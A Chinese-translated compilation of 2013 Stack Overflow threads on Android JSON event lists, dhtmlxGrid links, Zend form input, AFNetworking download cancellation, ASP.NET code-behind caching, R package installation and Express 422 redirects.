在 Android App 中，它有一页是使用 ListView 来显示事件名称。此活动名称为 Activity_List。在这个可以在 ListView 中显示事件名称的 Activity_List 类中。Activity_List 的编码：

```
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_list);

    setTitle("EMS");

    tvBack = (TextView) findViewById(R.id.tvBack);
    tvEng = (TextView) findViewById(R.id.tvEng);
    tvCh = (TextView) findViewById(R.id.tvCh);
    lstActivity = (ListView) findViewById(R.id.lstActivity);

    tvBack.setOnClickListener(new OnClickListener() {
        @Override
        public void onClick(View v) {
            // TODO Auto-generated method stub
            Intent i = new Intent(Activity_List.this, EMSActivity.class);
            startActivity(i);
        }
    });

    tvCh.setOnClickListener(new OnClickListener() {
        @Override
        public void onClick(View v) {
            // TODO Auto-generated method stub
            Intent i = new Intent(Activity_List.this, Activity_List.class);
            startActivity(i);
        }
    });

    loadJSONFromWebAsync();
}

public void loadJSONFromWebAsync() {
    Thread t = new Thread() {
        ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();

        // http post
        @Override
        public void run() {
            try {
                HttpClient httpclient = new DefaultHttpClient();
                HttpPost httppost = new HttpPost(
                        "http://www.ems.cixx6.com/AndroidEvent.php");
                httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
                HttpResponse response = httpclient.execute(httppost);
                HttpEntity entity = response.getEntity();
                is = entity.getContent();

                // convert response to string
                try {
                    BufferedReader reader = new BufferedReader(
                            new InputStreamReader(is, "utf-8"), 8);
                    sb = new StringBuilder();
                    sb.append(reader.readLine() + "\n");
                    String line = "0";
                    while ((line = reader.readLine()) != null) {
                        sb.append(line + "\n");
                    }
                    is.close();
                    result = sb.toString();
                } catch (Exception e) {
                    Toast.makeText(getBaseContext(), "change information losed",
                            Toast.LENGTH_LONG).show();
                }

                Activity_List.this.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        // TODO Auto-generated method stub
                        Activity_List.this.parseJSONAndRefreshListView();
                    }
                });
            } catch (Exception e) {
                Toast.makeText(getBaseContext(), "please check internet connection",
                        Toast.LENGTH_LONG).show();
            }
        }
    };
    t.run();
}

public void parseJSONAndRefreshListView() {
    // paring data
    try {
        jArray = new JSONArray(result);
        JSONObject json_data = null;

        for (int i = 0; i < jArray.length(); i++) {
            json_data = jArray.getJSONObject(i);
            int EventID = json_data.getInt("Event_ID");
            String event_Name = json_data.getString("Event_Name");
            myList.add(event_Name);
            myEventIDList.add("" + EventID);
        }

        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,
                android.R.layout.simple_list_item_1, myList);
        lstActivity.setAdapter(adapter);

        lstActivity.setOnItemClickListener(new OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> arg0, View arg1,
                    int arg2, long arg3) {
                // TODO Auto-generated method stub
                Intent i = new Intent(Activity_List.this,
                        Activity_Detail.class);
                int selectedID = Integer.parseInt(myEventIDList.get(arg2));
                Log.i("test", Integer.toString(selectedID));
                i.putExtra("ID", selectedID);

                startActivity(i);
            }
        });

    } catch (JSONException e1) {
        e1.printStackTrace();
        Toast.makeText(getBaseContext(), "can not find information", Toast.LENGTH_LONG)
                .show();
    } catch (ParseException e1) {
        e1.printStackTrace();
    }
} 
```

当用户单击其中一个事件时，它将进入 Activity_Detail 类以查看事件详细信息。我想将选定的事件 id 发送到 AndroidShowEvent php 页面。之后，它连接到数据库以选择符合 Activity_Detail 类中显示数据的事件 ID 记录。Activity_Detail 页面是使用 textView 来显示数据的。Activity_Detail 的编码：

```
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_detail);

    setTitle("EMS");

    tvBack = (TextView) findViewById(R.id.tvBack);
    tvEng = (TextView) findViewById(R.id.tvEng);
    tvCh = (TextView) findViewById(R.id.tvCh);
    tvEventName = (TextView) findViewById(R.id.tvEventName);
    tvEventLocationID = (TextView) findViewById(R.id.tvEventLocation);
    tvEventDate = (TextView) findViewById(R.id.tvEventDate);
    tvEventTime = (TextView) findViewById(R.id.tvEventTime);
    tvEventPhone = (TextView) findViewById(R.id.tvEventPhone);
    tvSpeakerName = (TextView) findViewById(R.id.tvSpeakerName);
    tvEventContent = (TextView) findViewById(R.id.tvEventContent);
    imgEventBanner = (ImageView) findViewById(R.id.imgEventBanner);
    BtnFacebook = (Button) findViewById(R.id.BtnFacebook);
    BtnTwitter = (Button) findViewById(R.id.BtnTwitter);

    tvEventLocationID.setOnClickListener(new OnClickListener() {
        @Override
        public void onClick(View v) {
            // TODO Auto-generated method stub
            Intent i = new Intent(Activity_Detail.this, PlaceMap.class);
            startActivity(i);
        }
    });

    tvSpeakerName.setOnClickListener(new OnClickListener() {
        @Override
        public void onClick(View v) {
            // TODO Auto-generated method stub
            Intent i = new Intent(Activity_Detail.this, Speaker.class);
            startActivity(i);
        }
    });

    BtnFacebook.setOnClickListener(new OnClickListener() {
        @Override
        public void onClick(View v) {
            // TODO Auto-generated method stub

        }
    });

    BtnTwitter.setOnClickListener(new OnClickListener() {
        @Override
        public void onClick(View v) {
            // TODO Auto-generated method stub

        }
    });

    tvBack.setOnClickListener(new OnClickListener() {
        @Override
        public void onClick(View v) {
            // TODO Auto-generated method stub
            Intent i = new Intent(Activity_Detail.this, EMSActivity.class);
            startActivity(i);
        }
    });

    tvCh.setOnClickListener(new OnClickListener() {
        @Override
        public void onClick(View v) {
            // TODO Auto-generated method stub
            Intent i = new Intent(Activity_Detail.this,
                    Activity_Detail.class);
            startActivity(i);
        }
    });

    EventID = this.getIntent().getIntExtra("ID", 0);

    String event = Integer.toString(EventID);
    Log.i("test", event);

    List<NameValuePair> params = new ArrayList<NameValuePair>();
    params.add(new BasicNameValuePair("eid", event));
    Log.i("test",String.valueOf(params));
    loadJSONFromWebAsync(params);
}

public void loadJSONFromWebAsync(List<NameValuePair> pair) {
    final List<NameValuePair> _pair = pair;
    Thread t = new Thread() {
        //ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();

        // http post
        @Override
        public void run() {
            try {
                HttpClient httpclient = new DefaultHttpClient();
                HttpPost httppost = new HttpPost(
                        "http://www.ems.cixx6.com/AndroidShowEvent.php");
                httppost.setEntity(new UrlEncodedFormEntity(_pair));
                HttpResponse response = httpclient.execute(httppost);
                HttpEntity entity = response.getEntity();
                is = entity.getContent();

                // convert response to string
                try {
                    BufferedReader reader = new BufferedReader(
                            new InputStreamReader(is, "utf-8"), 8);
                    sb = new StringBuilder();
                    sb.append(reader.readLine() + "\n");
                    String line = "0";
                    while ((line = reader.readLine()) != null) {
                        sb.append(line + "\n");
                    }
                    is.close();
                    result = sb.toString();
                } catch (Exception e) {
                    Toast.makeText(getBaseContext(), "change information losed",
                            Toast.LENGTH_LONG).show();
                }

                Activity_Detail.this.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        // TODO Auto-generated method stub
                        Activity_Detail.this.parseJSONAndRefreshListView();
                    }
                });
            } catch (Exception e) {
                Toast.makeText(getBaseContext(), "please check Internet connection",
                        Toast.LENGTH_LONG).show();
            }
        }
    };
    t.run();
}

public void parseJSONAndRefreshListView() {
    // paring data
    try {
        jArray = new JSONArray(result);
        JSONObject json_data = null;
        for (int i = 0; i < jArray.length(); i++) {
            json_data = jArray.getJSONObject(i);
            String Event_Name = json_data.getString("Event_Name");
            String Event_Location = json_data.getString("Event_Location");
            String Event_StartTime = json_data.getString("Event_StartTime");
            String Event_EndTime = json_data.getString("Event_EndTime");
            String Event_Phone = json_data.getString("Event_Phone");
            String Event_StartDate = json_data.getString("Event_StartDate");
            String Event_EndDate = json_data.getString("Event_EndDate");
            String Event_Description = json_data
                    .getString("Event_Description");
            String Event_Description2 = Event_Description.replace("<br>",
                    "\n");
            String Event_Image = json_data.getString("Event_Image");
            String Speaker_Name = json_data.getString("Speaker_Name");

            tvEventName.setText(Event_Name);
            tvEventDate.setText(Event_StartDate + " 至 " + Event_EndDate);
            tvEventTime.setText(Event_StartTime + " 至 " + Event_EndTime);
            tvEventPhone.setText(Event_Phone);
            tvEventContent.setText(Event_Description2);

            SpannableString contentUnderline = new SpannableString(
                    Event_Location);
            contentUnderline.setSpan(new UnderlineSpan(), 0,
                    contentUnderline.length(), 0);
            tvEventLocationID.setText(contentUnderline);

            SpannableString contentUnderline2 = new SpannableString(
                    Speaker_Name);
            contentUnderline2.setSpan(new UnderlineSpan(), 0,
                    contentUnderline2.length(), 0);
            tvSpeakerName.setText(contentUnderline2);

            Bitmap bitmap = DownloadImage("http://www.ems.cixx6.com/"
                    + Event_Image);
            imgEventBanner.setImageBitmap(bitmap);
        }
    } catch (JSONException e1) {
        e1.printStackTrace();
        Toast.makeText(getBaseContext(), "can not find information", Toast.LENGTH_LONG)
                .show();
    } catch (ParseException e1) {
        e1.printStackTrace();
    }
}

private InputStream OpenHttpConnection(String urlString) throws IOException {
    InputStream in = null;
    int response = -1;

    URL url = new URL(urlString);
    URLConnection conn = url.openConnection();

    if (!(conn instanceof HttpURLConnection))
        Toast.makeText(getBaseContext(), "please check Internet connection", Toast.LENGTH_LONG)
                .show();
    try {
        HttpURLConnection httpConn = (HttpURLConnection) conn;
        httpConn.setAllowUserInteraction(false);
        httpConn.setInstanceFollowRedirects(true);
        httpConn.setRequestMethod("GET");
        httpConn.connect();

        response = httpConn.getResponseCode();
        if (response == HttpURLConnection.HTTP_OK) {
            in = httpConn.getInputStream();
        }
    } catch (Exception ex) {
        Toast.makeText(getBaseContext(), "Internet connection was losed", Toast.LENGTH_LONG)
                .show();
    }
    return in;
}

private Bitmap DownloadImage(String URL) {
    Bitmap bitmap = null;
    InputStream in = null;
    try {
        in = OpenHttpConnection(URL);
        bitmap = BitmapFactory.decodeStream(in);
        in.close();
    } catch (IOException e1) {
        // TODO Auto-generated catch block
        e1.printStackTrace();
    }
    return bitmap;
} 
```

因此。只显示了一个 Toast。消息是“找不到信息”。其他数据未显示。

我的目的是在 Activity_Detail 类中显示合适的事件数据。我应该如何修改代码？

这个问题让我很困扰，请帮帮我！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T04:23:15.940

使用 e1.printStackTrace() 的错误消息；<-- 由于我的声誉不够，所以我不能发布图像的错误消息。

但是我的php编码没有错误？？

因为我怀疑 AndriodShowEvent php 页面无法在 android 中获取选定的事件 id，因此它无法在 Activity_Detail 页面中显示详细信息。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-18T19:16:39.930

可能是发送请求或解析 json 的问题。

您可以使用 e1.printStackTrace() 发布错误消息吗？

# javascript - 添加到 dhtmlxGrid 的链接

> ID：16091089
> 
> 赞同：0
> 
> 时间：2013-04-18T19:01:58.147
> 
> 标签：javascript, jquery, ajax, dhtmlx

我正在使用 dhtmlxGrid，并且我有许多从 ColdFusion 中的查询返回的记录。然后我遍历该记录集并创建 JSON 并让网格解析它。

我感兴趣的是将 HTML 链接添加到一列，以便使用该链接转到该特定记录的不同页面。

这里有一个例子：[http ://www.dhtmlx.com/docs/products/dhtmlxGrid/samples/01_cell_types/04_link_grid.html](http://www.dhtmlx.com/docs/products/dhtmlxGrid/samples/01_cell_types/04_link_grid.html)

我的问题是我正在使用。

```
mygrid.parse(data, "json"); 
```

将数据加载到网格中并根据文档链接是通过将 XML 文件传递​​给网格来创建的，如下所示：

```
mygrid.loadXML("../common/grid_links.xml"); 
```

似乎如果我加载这个 XML，它会搞砸我用 JSON 创建的网格。

我很好奇是否有人遇到过同样的情况，或者我可以使用

```
mygrid.parse(somenewdata, "json"); 
```

在 HTML 信息中加载？

TIA

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:08:17.727

你的 XML 是否有和标头

```
<?php  
header ("Content-Type:text/xml");  
echo '....your xml data.....';
exit();
?> 
```

它搞砸了您的 DHTMLX 网格数据，因为您的 XML 数据与 DHTMLX 上显示的示例不正确。以 XML 格式正确设置数据为例：[http ://www.dhtmlx.com/docs/products/docsExplorer/doc/dhtmlxxml/index.html](http://www.dhtmlx.com/docs/products/docsExplorer/doc/dhtmlxxml/index.html)

因此，请确保您的 XML 文件与上面一样简单正确。在 XML 标签下使用 ISO 数据时要小心：标签内`<![CDATA[`的封闭标签。如果不可读并且没有给出正确的结果，它将引发错误。`]]>``<cell>`

指向此文档可能对您有帮助：[http ://docs.dhtmlx.com/doku.php?id=dhtmlxgrid:configuration_from_xml](http://docs.dhtmlx.com/doku.php?id=dhtmlxgrid:configuration_from_xml)

希望这可以帮助。

* * *

对于 JSON，最好将其描述为示例： JSON PHP 文件：[http ://www.dhtmlx.com/docs/products/dhtmlxGrid/samples/12_initialization_loading/09_init_grid_json.html](http://www.dhtmlx.com/docs/products/dhtmlxGrid/samples/12_initialization_loading/09_init_grid_json.html)

和网格渲染布局：[http ://www.dhtmlx.com/docs/products/dhtmlxGrid/samples/12_initialization_loading/09_init_grid_json.html](http://www.dhtmlx.com/docs/products/dhtmlxGrid/samples/12_initialization_loading/09_init_grid_json.html)

如果您希望从 URI 调用的 JSON 文件以“http://...”开头，只需确保将其加载为 PHP 文件并在 PHP 文件内部呈现`json_encode()`数据或手动将其调用到 PHP 中的另一个源。所以你的文件只需要渲染示例：

* * *

`JSON PHP FILE myjson.php?callsome=1`

```
<?php 

if ($_GET["callsome"] == "1")
{
    header('Content-type: application/json');

    echo file_get_contents('http://www.somewhere.com/some.json');

    exit();
} 
```

并调用解析：

```
 mygrid.parse("/myjson.php?callsome=1", "json"); 
```

或者，如果您需要直接分配作为包含数据的示例：

```
 <?php

 $var = file_get_contents('some_json_data.php');

 echo $var; // your returned JSON data from included 
```

# php - 从 Zend 框架获取表单输入

> ID：16091090
> 
> 赞同：0
> 
> 时间：2013-04-18T19:01:58.137
> 
> 标签：php, zend-framework, post, zend-form

我冒险进入 Zend 框架并决定构建一个简单的应用程序来练习。我正在构建的应用程序是一个简单的计算器，它允许用户对两个数字进行加减乘除。

我无法检索用户输入来计算答案。当我`Zend_Debug::dump($this->getRequest()->getParams());`在该`IndexAction()`方法中使用时，它会在页面上正确显示表单数据，但是如何将数据发送到正确的模型进行处理？

这是`IndexController.php`文件：

```
<?php

class IndexController extends Zend_Controller_Action
{

    //initialize calculator form on controller call
    public function init()
    {

        //istantiate Zend_Form object
        $form = new Zend_Form();
        $form->setAction('')
             ->setMethod('post');

        //first number input
        $num1 = $form->createElement('text', 'num1');
        $num1->addValidator('Digits')
             ->setRequired(true)
             ->setAttrib('placeholder', 'Enter First Number');

        //second number input    
        $num2 = $form->createElement('text', 'num2');
        $num2->addValidator('Digits')
             ->setRequired(true)
             ->setAttrib('placeholder', 'Enter Second Number');

        //math operator select box
        $op = $form->createElement('select', 'operator');
        $op->setRequired(true)
              ->setMultiOptions(array('1'=>'+', '2'=>'-', '3'=>'X', '4'=>'/'))
              ->setRequired(true);

        //add elements to form
        $form->addElement($num1)
             ->addElement($op)           
             ->addElement($num2)
             ->addElement('submit', 'equal', array('label' => '='));

        return $form;
    }

    public function indexAction()
    {
        //render the form view
        $this->view->form = $this->init();
        $this->render('index');

    }

    public function calcAction()
    {

        $form = $this->form;
        $data = $this->getRequest()->getParams();

        if ($data->isPost()) {

            if($data->isValid()) {

                $calculator = new Calculator_Model;

                switch($data['operator']) {
                    case $data['operator'] === '1':
                       $ans = $calculator->addNums($data['num1'], $data['num2']);
                       return $ans;
                       break;
                    case $data['operator'] === '2':
                        $ans = $calculator->subtractNums($data['num1'], $data['num2']);
                        return $ans;
                        break;
                    case $data['operator'] === '3':
                        $ans = $calculator->multiplyNums($data['num1'], $data['num2']);
                        return $ans;
                        break;
                    case $data['operator'] === '4':
                        $ans = $calculator->divideNums($data['num1'], $data['num2']);
                        return $ans;
                        break;
                }

            } else {
                return $form->getMessages();
            }
        } 
    }

} 
```

我尝试将`calcAction()`脚本放入`indexAction()`方法中，但页面根本不呈现。如何让用户输入`Calculator_Model`进行处理？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T11:37:21.643

我想你做的大部分事情都是正确的，但我个人认为你不应该在控制器中做太多的编程。您的控制器不仅将数据传递给模型，它实际上还试图找出要调用的函数。

这应该由模型完成。问题很简单，解决方案也很简单，但这不会是可扩展的。考虑到您希望添加一个操作，您必须在模型中创建它的函数并在控制器中添加一个案例。

我通常做的是

检查表格是否有效：`$form->isValid()`

实例化模型：`$cal = new Model()`

将数据传递给模型：`$calc->process($form->getValues())`

process() 将是我模型中唯一的公共方法。switch case 语句将进入该方法并调用适当的受保护方法。我也会让模型决定表单中运算符元素的选项 `$op->setMultiOptions(Model::$availableOperations)` 这样我就可以在需要添加操作时更新我的​​模型。

我希望这一切对某人有意义。:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-22T16:42:22.193

我找到了解决这个问题的方法。

我改为`$data = $this->getRequest()->getParams();`并`$data = $this->getRequest()->getPost();`开始正确获取数据。我不知道是什么阻止了数据通过，`getParams();`但我发现`getParams();`它不能使用该`Zend_Filter();`函数验证数据，`getPost();`但是可以。

计算器应用程序现在完成的代码与此处粘贴的代码完全不同。您可以在以下位置查看最终产品：[https ://github.com/TylerB24890/Zend-Calculator](https://github.com/TylerB24890/Zend-Calculator)

在我的最终应用程序中，我必须为数字输入创建一个单独的验证器类，以允许整数和浮点数。我没有将这些分配给该`Zend_Filter()`功能，因为我无法使它们正常工作。如果有人对如何使这些工作有任何提示，请通过上面的链接为 GitHub 项目做出贡献。

# ios - 如何取消 AFHTTPRequestOperation 并且不保留以前的进度

> ID：16091091
> 
> 赞同：0
> 
> 时间：2013-04-18T19:01:59.400
> 
> 标签：ios, download, afnetworking

我有一个用于测试`AFNetworking`API 的应用程序。它从服务器下载文档并将它们放置在应用程序的沙箱中。用户可以开始下载、暂停/恢复下载和取消下载。按预期启动、暂停和恢复所有工作。然而，取消做了一些我不期望的事情。

**应用程序**

表中的每个单元格代表一个“下载”，这是我的模型。表格视图控制器监听单元格中的点击并发送消息到`begin`///下载。我有一个类来跟踪我的下载模型对象。我有第三堂课（使用作者推荐的模式）。调用相应的消息，然后在 . 上调用相应的方法。`cancel``pause``resume``DownloadManager``AFFileDownloadAPIClient``AFHTTPClient``AFNetworking``DownloadManager``AFFileDownloadAPIClient``NSOperation`

![一个简单的 AFNetworking 下载跟踪应用](https://i.stack.imgur.com/f4RAp.png)

**编码**

下面的方法创建一个新的`AFHTTPRequestOperation`，将位流式传输到一个文件（这工作正常），并将它扔到一个队列中，为我启动操作。需要注意的几件事：1）我在`"Content-Disposition"`标题中放入了一些元数据，例如内容长度和生成的文件名，因为下载开始时都不知道。请记住，这些位正在流式传输给我。2)`AFFileDownloadAPIClient`保留一个带有整数索引键的字典，并且`AFHTTPRequestOperation`对于每个下载对应于`UITableView`. 我发现这有必要稍后将操作检索到`pause`,`resume`等...

这是在`AFFileDownloadAPIClient`：

```
- (void)downloadFileWithIndex:(int)index fileName:(NSString *)fileName {

// Using standard request operation
AFHTTPRequestOperation *operation = [[AFHTTPRequestOperation alloc] initWithRequest:request];

operation.inputStream = [NSInputStream inputStreamWithURL:request.URL];
operation.outputStream = [NSOutputStream outputStreamToFileAtPath:fileInDocumentsPath append:YES];

 // BLOCK level variables //
 __weak AFHTTPRequestOperation *weakOperation = operation;   // For use in download progress BLOCK
 __weak NSDate *startTime = [NSDate date];

[operation setCompletionBlockWithSuccess:^(AFHTTPRequestOperation *operation, id responseObject) {

    NSHTTPURLResponse *response = (NSHTTPURLResponse*)weakOperation.response;
    NSString *contentDisposition = [[response allHeaderFields] objectForKey:@"Content-Disposition"];
    NSArray *dispositionMetadata = [contentDisposition componentsSeparatedByString:@";"];

    NSString *fileName = @"<?>";

    // 3rd item is file name
    if (dispositionMetadata != nil && dispositionMetadata.count == 4)
    {
        fileName = [dispositionMetadata objectAtIndex:2];
    }

    if ([_downloadFileRequestDelegate respondsToSelector:@selector(downloadFileRequestFinishedWithData:fileName:atIndex:startTime:)])
        [_downloadFileRequestDelegate downloadFileRequestFinishedWithData:responseObject fileName:fileName atIndex:index startTime:startTime];

}

failure:^(AFHTTPRequestOperation *operation, NSError *error) {

        if ([_downloadFileRequestDelegate respondsToSelector:@selector(downloadFileRequestFailedWithError:atIndex:startTime:)])
            [_downloadFileRequestDelegate downloadFileRequestFailedWithError:error atIndex:index startTime:startTime];
    }
];

// Check "Content-Disposition" for content-length    
[operation setDownloadProgressBlock:^(NSUInteger bytesRead, long long totalBytesRead, long long totalBytesExpectedToRead) {

    NSHTTPURLResponse *response = (NSHTTPURLResponse*)weakOperation.response;
    NSString *contentDisposition = [[response allHeaderFields] objectForKey:@"Content-Disposition"];
    NSArray *dispositionMetadata = [contentDisposition componentsSeparatedByString:@";"];

    // 4th item is length
    if (dispositionMetadata != nil && dispositionMetadata.count == 4)
    {
        totalBytesExpectedToRead = [[dispositionMetadata objectAtIndex:3] doubleValue];
    }

    // Notify the delegate of the progress
    if ([_requestProgressDelegate respondsToSelector:@selector(requestDidReceiveBytesForIndex:bytes:totalBytes:)])
        [_requestProgressDelegate requestDidReceiveBytesForIndex:index bytes:bytesRead totalBytes:totalBytesExpectedToRead];
}];

// Check to see if operation is already in our dictionary 
if ([[self.downloadOperations allKeys] containsObject:[NSNumber numberWithInt:index]] == YES)
    [self.downloadOperations removeObjectForKey:[NSNumber numberWithInt:index]];

// Add operation to storage dictionary
[self.downloadOperations setObject:operation forKey:[NSNumber numberWithInt:index]];

// Queue up the download operation. No need to start the operation explicitly
[self enqueueHTTPRequestOperation:operation];

} 
```

现在是`cancel`, `pause`,`resume`方法。请记住，暂停和恢复功能似乎工作得很好。

```
- (void)cancelDownloadForIndex:(int)index {

AFHTTPRequestOperation *operation = [self.downloadOperations objectForKey:[NSNumber numberWithInt:index]];

if (operation != nil) {

    [operation cancel];

    // Remove object from dictionary
    [self.downloadOperations removeObjectForKey:[NSNumber numberWithInt:index]];
}
}

- (void)pauseDownloadForIndex:(int)index {

AFHTTPRequestOperation *operation = [self.downloadOperations objectForKey:[NSNumber numberWithInt:index]];

if (operation != nil)
    [operation pause];
}

- (void)resumeDownloadForIndex:(int)index {

AFHTTPRequestOperation *operation = [self.downloadOperations objectForKey:[NSNumber numberWithInt:index]];

if (operation != nil)
    [operation resume];
} 
```

**问题**

假设我们要在中途取消下载。我会点击“开始”然后等待几秒钟。然后点击“X”取消。下面是之前/之后的图像。（左边之前，右边之后）。

![下载和取消操作之前/之后](https://i.stack.imgur.com/oQqFD.png)

在您点击“X”后，视图会更改为显示原始的“GO”按钮，以便您可以重试，在这种情况下，我将其称为就绪状态（或“之前”）。我不明白的是，当我在刚刚取消的同一个下载中第二次点击“开始”时，我的进度指示器会在原来的 1.98 MB 停止的地方重新拾取....好像取消没有'不要删除下载的原始字节，记住它们并从中断的地方继续。为什么？

![下载和取消操作之前/之后](https://i.stack.imgur.com/oQqFD.png)

**问题**

1.  为什么取消后的下载从中断的地方继续？
2.  这种行为是预期的还是意外的？

对于这篇冗长的帖子，我深表歉意，并感谢您阅读本文。

**[编辑 1]**

为了更新`progressView`，`UITableViewCell`我至少要做这两件事。

1.  使用我称之为的数据模型类`Download`。
2.  使用管理我的模型`Download`对象及其状态的数据模型管理器类。

在表格视图控制器中，我在给定索引处侦听给定下载接收到的字节：

```
- (void)downloadDidReceiveBytesForIndex:(int)downloadIndex bytes:(long long)bytes totalBytes:(double)totalBytes {

NSIndexPath *path = [NSIndexPath indexPathForRow:downloadIndex inSection:0];

DownloadTableViewCell *cell = (DownloadTableViewCell*)[self.tableView cellForRowAtIndexPath:path];

Download *download = [_downloadManager.downloads objectAtIndex:path.row];
download.bytesDownloaded += bytes;
download.percentageDownloaded = download.bytesDownloaded / totalBytes;

// as a factor of 0.0 to 1.0 not 100.
cell.downloadProgressView.progress = download.percentageDownloaded;

float MB_CONVERSION_FACTOR = 0.000000953674;

NSString *bytesText = [NSString stringWithFormat:@"Downloading %.2f of %.2f MB", roundf((download.bytesDownloaded * MB_CONVERSION_FACTOR)*100)/100.0, roundf((totalBytes * MB_CONVERSION_FACTOR)*100)/100.0];

cell.downloadProgressLabel.text = bytesText;
} 
```

最后，为了处理滚动表和`UITableViewCell`对象的重用。我必须确保正确创建我的单元格，对应于正确的下载（在给定索引处）并反映下载的确切状态。其中一些可能是矫枉过正，但它似乎运作良好。不过，我还没有在仪器中对此进行测试，以查看是否/何时泄漏任何东西：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
static NSString *CellIdentifier = @"Cell";
DownloadTableViewCell *cell = (DownloadTableViewCell*)[tableView dequeueReusableCellWithIdentifier:CellIdentifier];

if (cell == nil) {

    UIViewController *temporaryController = [[UIViewController alloc] initWithNibName:@"DownloadTableViewCell" bundle:nil];
    // Grab a pointer to the custom cell.
    cell = (DownloadTableViewCell *)temporaryController.view;

    [cell initState];

    // Listens for method calls on cell
    cell.delegate = self;

    cell.selectionStyle = UITableViewCellSelectionStyleNone;
}

// Set index for this cell (it could be wrong if cell is re-used)
cell.downloadIndex = indexPath.row;

Download *download = [_downloadManager.downloads objectAtIndex:indexPath.row];
cell.downloading = download.downloading;

cell.nameLabel.text = download.name;
cell.descriptionLabel.text = download.description;
cell.downloadProgressView.progress = download.percentageDownloaded;

// Check for completed status
cell.completed = download.completed;
cell.completedFileNameLabel.text = download.fileName;

return cell;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T14:56:00.163

在取消下载方法中从集合中删除时，似乎正在释放 outputStream。但是，由于下载被取消，下载实例上的状态不会发生变化。如果该对象继续具有`totalBytes`并`percentageDownloaded`设置值，则进度视图将继续反映部分下载状态。

# asp.net - ASP.NET 代码隐藏更改不显示

> ID：16091094
> 
> 赞同：0
> 
> 时间：2013-04-18T19:02:26.983
> 
> 标签：asp.net, visual-studio-2010, code-behind

我正在尝试对 asp.net 文件的 C# 代码隐藏进行更改。在 Visual Studio 中编译并发布后，aspx.cs 中的任何更改都不会出现，而对 aspx 文件的更改会出现。我还删除了 Temporary ASP.NET Files 文件夹的内容，但没有效果。

我是否缺少某些东西可以阻止更改显示？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T12:41:25.137

最终解决该问题的是从项目 bin 文件夹中删除由 Visual Studio 组装的 dll。我曾假设 Visual Studio 在运行 Clean Solution 时将其删除，但似乎没有。我通过转到项目属性 > 应用程序然后检查程序集名称来验证组装 dll 的名称。

删除组装好的 dll 后，我运行 Clean Solution、Build Solution 和 Publish Project，然后一切正常！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-05-11T07:27:23.763

我遇到过几次类似的问题。尝试以下解决方案：

1.  关闭 Visual Studio 2012。
2.  清除 c:\Users[your_user]\AppData\Roaming\Microsoft\VisualStudio\11.0\ReflectedSchemas\ 文件夹。
3.  重新打开您的应用程序。

# r - 无法在 R 2.14.1 中安装 ggplot 包

> ID：16091096
> 
> 赞同：4
> 
> 时间：2013-04-18T19:02:30.223
> 
> 标签：r

我试图在 ubuntu R 2.14.1 上安装包 gplots

```
install.packages('gplots') 
```

我收到这条消息：

```
Warning in install.packages :
  package ‘gplots’ is not available (for R version 2.14.1) 
```

我可能会认为这只是这个版本的本地问题，因为其他人能够正确安装它。我试图通过谷歌搜索找到解决方案，但没有任何相似之处。

有什么想法可以解决这个问题吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-18T19:06:04.370

[在这里](http://cran.r-project.org/src/contrib/Archive/gplots)查看存档的 gplots 版本。只需获取旧版本，应该可以正常安装。或者，添加 CRAN 提供给您的 ubuntu 存储库 sources.list 并将 R 升级到 3.0 版。之后安装`gplots`应该没问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-18T19:08:09.493

看看这个链接[http://r.789695.n4.nabble.com/Error-in-library-gplots-there-is-no-package-called-gplots-td1690367.html](http://r.789695.n4.nabble.com/Error-in-library-gplots-there-is-no-package-called-gplots-td1690367.html)。您使用的 R 版本似乎与包“gplots”不兼容。

# javascript - 如何停止显示中间页面的 node.js 422（不可处理实体）重定向

> ID：16091100
> 
> 赞同：0
> 
> 时间：2013-04-18T19:02:52.610
> 
> 标签：javascript, node.js, http, redirect, httpresponse

当我这样做时：

```
app.post('/account', function(req, res){

    // attempt to validate input and insert user into db
    signUpUser(req.body, function(success){

        if(success){

            // validation and sign up process successful - send to account page
            res.redirect(302, '/account');

        }else{

            // validation or something else failed - redirect to register page 
            // and ask them to try again
            res.redirect(422, '/register');

        }
    };
}) 
```

重定向工作得`302`很好，但是`422`重定向将用户发送到一个刚刚读取的页面

* * *

![422节点响应页面](https://i.stack.imgur.com/UNsGG.png)

* * *

我该如何阻止它这样做？我不想显示一个页面，要求用户单击链接到它要去的地方，我希望它只是去那里。我可以改用`302`代码响应，但`422`更准确地描述了正在发生的事情。

有任何想法吗？非常感谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-02-04T14:18:13.830

它的状态代码以`3`使浏览器重定向（[维基百科](http://en.wikipedia.org/wiki/URL_redirection#HTTP_status_codes_3xx)）开始的原因，所以自然不能同时拥有 HTTP 重定向和`422`状态代码。您在这里有一些选择：

1.  返回 3xx 状态
2.  返回 422 状态并且不进行重定向
3.  返回任何状态并使用[javascript](https://stackoverflow.com/questions/4744751/how-do-i-redirect-with-javascript)或[元标记](http://en.wikipedia.org/wiki/Meta_refresh)执行重定向

我推荐选项2：

1.  如果您正在构建 API，您不需要任何 HTTP 重定向，只需要有关问题所在的信息
2.  如果您正在构建 Web 应用程序，通常的做法是在成功时重定向并在出现问题时填写错误的表单（抱歉没有相关来源，也许有人可以提供帮助？）

